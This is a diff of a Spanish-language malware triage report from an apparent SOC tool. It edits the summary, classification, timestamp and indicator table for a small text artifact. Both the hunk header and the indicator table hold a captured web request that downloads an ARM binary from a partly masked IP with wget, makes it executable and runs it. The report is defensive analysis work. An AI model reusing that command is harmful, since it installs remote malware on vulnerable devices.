@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto de 513 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.35. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:49:11+00:00`
+- **Registrado:** `2026-08-09T19:49:11.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -51,10 +51,10 @@ GET /shell?cd+/tmp;rm+main_arm+main_arm7+arm7+arm;wget+http:/\/201.51.13.XXX/mai
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.168.XXX | static_analysis |
 | ip | 201.51.13.XXX | static_analysis |
-| hash | bde4d32266e74f7b295e9906a88ae0cad9d9a6d4c762e5d7cfd344a3baa30acb | static_analysis |
+| ip | 190.179.168.XXX | static_analysis |
 | command | GET /shell?cd+/tmp;rm+main_arm+main_arm7+arm7+arm;wget+http:/\/201.51.13.XXX/main_arm7;chmod+777+main_arm7;./main_arm7+je | strings |
+| hash | bde4d32266e74f7b295e9906a88ae0cad9d9a6d4c762e5d7cfd344a3baa30acb | static_analysis |
 
 ## 🔎 Triage
 
